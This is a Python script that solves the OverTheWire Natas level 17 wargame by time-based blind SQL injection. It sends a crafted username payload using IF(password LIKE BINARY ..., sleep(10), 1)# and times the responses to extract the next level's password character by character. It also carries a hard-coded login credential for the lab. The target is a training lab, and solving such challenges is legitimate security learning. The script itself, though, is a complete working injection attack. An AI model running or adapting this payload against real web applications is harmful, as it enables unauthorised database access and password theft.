import requests
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
available_chars = ""
password = ""


#find any values that contain x in any position -> %x%

print("Getting the chars that the password contains!")
for char in chars:
	#change this payload
    data_to_give = {"username" : 'natas18" AND IF(password LIKE BINARY "%'+char+'%", sleep(10), 1)#'}
    r = requests.post(url, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=data_to_give)
    if r.elapsed.seconds > 3:
        available_chars = available_chars + char


#using those values build a password
print("\n\nGetting the password now!")

#check if any of the available chars match the current char of the password
#we did range(0,32) because it's the length of the password
for i in range(0,32):
    for char in available_chars:
        data_to_give = {"username" : 'natas18" AND IF(password LIKE BINARY "'+password+char+'%", sleep(10), 1)#'}
        r = requests.post(url, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=data_to_give)
        if r.elapsed.seconds > 3:
            password = password + char
            print(password)



print("\nDone!")
print("The password is " + password)
